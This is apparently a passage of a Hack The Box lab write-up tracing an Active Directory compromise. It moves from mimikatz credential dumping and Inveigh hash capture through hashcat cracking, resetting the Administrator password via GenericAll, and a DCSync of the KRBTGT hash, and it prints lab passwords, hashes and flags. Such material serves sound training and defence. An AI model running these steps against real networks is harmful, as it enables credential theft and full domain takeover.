+[*] uploading  : /home/htb-student/Desktop/mimikatz64.exe -> mimikatz64.exe
+[*] Uploaded 1.25 MiB of 1.25 MiB (100.0%): /home/htb-student/Desktop/mimikatz64.exe -> mimikatz64.exe
+[*] uploaded   : /home/htb-student/Desktop/mimikatz64.exe -> mimikatz64.exe
+```
+
+```
+(Meterpreter 1)(C:\) > shell
+
+Process 2608 created.
+Channel 9 created.
+Microsoft Windows [Version 10.0.17763.2628]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\>mimikatz64.exe
+mimikatz64.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+
+<SNIP>
+
+Authentication Id : 0 ; 213027 (00000000:00034023)
+Session           : Interactive from 1
+User Name         : mssqlsvc
+Domain            : INLANEFREIGHT
+Logon Server      : DC01
+Logon Time        : 12/12/2022 8:20:40 AM
+SID               : S-1-5-21-3327542485-274640656-2609762496-4613
+	msv :	
+	 [00000003] Primary
+	 * Username : mssqlsvc
+	 * Domain   : INLANEFREIGHT
+	 * NTLM     : 8c9555327d95f815987c0d81238c7660
+	 * SHA1     : 0a8d7e8141b816c8b20b4762da5b4ee7038b515c
+	 * DPAPI    : a1568414db09f65c238b7557bc3ceeb8
+	tspkg :	
+	wdigest :	
+	 * Username : mssqlsvc
+	 * Domain   : INLANEFREIGHT
+	 * Password : (null)
+	kerberos :	
+	 * Username : mssqlsvc
+	 * Domain   : INLANEFREIGHT.LOCAL
+	 * Password : Sup3rS3cur3maY5ql$3rverE
+```
+
+Move laterally to the next machine, authenticating to 172.16.7.50 as `mssqlsvc:Sup3rS3cur3maY5ql$3rverE`:
+
+```
+xfreerdp /v:172.16.7.50 /u:mssqlsvc /p:'Sup3rS3cur3maY5ql$3rverE' /dynamic-resolution
+```
+<img width="759" height="344" alt="image" src="https://github.com/user-attachments/assets/332d933e-57b0-43da-9351-d07c14d2927a" />
+
+flag = `exc3ss1ve_adm1n_r1ights!`
+
+Download Inveigh.ps1 and transfer it over to MS01:
+
+```
+wget -q https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 && scp Inveigh.ps1 htb-student@10.129.73.75:/home/htb-student/Desktop
+
+htb-student@10.129.73.75's password: 
+Inveigh.ps1    
+```
+
+```
+PS C:\Users\mssqlsvc\Desktop> Import-Module .\Inveigh.ps1
+PS C:\Users\mssqlsvc\Desktop> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+
+[*] Inveigh 1.506 started at 2022-11-29T14:24:15
+[+] Elevated Privilege Mode = Enabled
+[+] Primary IP Address = 172.16.7.50
+[+] Spoofer IP Address = 172.16.7.50
+[+] ADIDNS Spoofer = Disabled
+[+] DNS Spoofer = Enabled
+
+<SNIP>
+
+[*] Press any key to stop console output
+[+] [2022-11-29T14:24:27] TCP(445) SYN packet detected from 172.16.7.3:51009
+[+] [2022-11-29T14:24:27] SMB(445) negotiation request detected from 172.16.7.3:51009
+[+] [2022-11-29T14:24:27] SMB(445) NTLM challenge F8059BA109C97E0D sent to 172.16.7.3:51009
+[+] [2022-11-29T14:24:27] SMB(445) NTLMv2 captured for INLANEFREIGHT\CT059 from 172.16.7.3(DC01):51009:
+CT059::INLANEFREIGHT:F8059BA109C97E0D:78A41190201430E8654DE55727DF7EB5:010100000000000089A153943004D901BDD5DA8680F87B870000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080089A153943004D901060004000200000008003000300000000000000000000000002000007A0B42C80CDAF1780F6DFBD615855858C454CE6D589CE7368945318F68520DD80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000
+```
+
+Crack the hash found using hashcat: 
+
+<img width="1195" height="434" alt="image" src="https://github.com/user-attachments/assets/e9fc4fe6-bf3c-4da9-ba7b-e6e895766996" />
+
+```
+hashcat -m 5600 ct509.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+<snip >
+* Keyspace..: 14344385
+
+CT059::INLANEFREIGHT:f8059ba109c97e0d:78a41190201430e8654de55727df7eb5:010100000000000089a153943004d901bdd5da8680f87b870000000002001a0049004e004c0041004e0045004600520045004900470048005400010008004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00030030004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000700080089a153943004d901060004000200000008003000300000000000000000000000002000007a0b42c80cdaf1780f6dfbd615855858c454ce6d589ce7368945318f68520dd80a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0037002e0035003000000000000000000000000000:charlie1   <============
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: CT059::INLANEFREIGHT:f8059ba109c97e0d:78a4119020143...000000
+Time.Started.....: Sun Sep 21 22:59:39 2025 (0 secs)
+Time.Estimated...: Sun Sep 21 22:59:39 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#2.........:  1039.5 kH/s (1.05ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 2048/14344385 (0.01%)
+Rejected.........: 0/2048 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#2....: 123456 -> lovers1
+
+Started: Sun Sep 21 22:59:38 2025
+Stopped: Sun Sep 21 22:59:41 2025
+
+```
+
+password = `charlie1`
+
+Authenticate as CT059:charlie1 to 172.16.7.50:
+
+```
+xfreerdp /v:172.16.7.50 /u:CT059 /p:charlie1 /dynamic-resolution
+```
+
+Bloodhound data will identify the final phase of the attack chain. The CT059 user has GenericAll rights over the Domain Admins group:
+
+<img width="749" height="329" alt="image" src="https://github.com/user-attachments/assets/b72e5326-be3c-4326-805c-3b1503f7f233" />
+
+<img width="763" height="540" alt="image" src="https://github.com/user-attachments/assets/af32d8e1-fbe2-49ef-ab38-aaf94ad94f14" />
+
+
+Add the CT059 user to the Domain Administrators group or alternatively change the administrator's password to Welcome1:
+
+```
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\CT059> net user Administrator Welcome1 /domain
+
+The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.
+
+The command completed successfully.
+```
+
+wmiexec.py will be used to connect to DC01 and print out the flag file:
+
+```
+└──╼ $wmiexec.py administrator@172.16.7.3
+
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+
+C:\>type C:\Users\administrator\desktop\flag.txt
+
+acLs_f0r_th3_w1n!
+```
+
+DCSync the KRBTGT NTLM hash with secretsdump.py:
+
+```
+secretsdump.py administrator@172.16.7.3 -just-dc-user KRBTGT
+
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7eba70412d81c1cd030d72a3e8dbe05f:::
+[*] Kerberos keys grabbed
+krbtgt:aes256-cts-hmac-sha1-96:b043a263ca018cee4abe757dea38e2cee7a42cc56ccb467c0639663202ddba91
+krbtgt:aes128-cts-hmac-sha1-96:e1fe1e9e782036060fb7cbac23c87f9d
+krbtgt:des-cbc-md5:e0a7fbc176c28a37
+[*] Cleaning up...
+```
+
+`7eba70412d81c1cd030d72a3e8dbe05f`
 
 
 
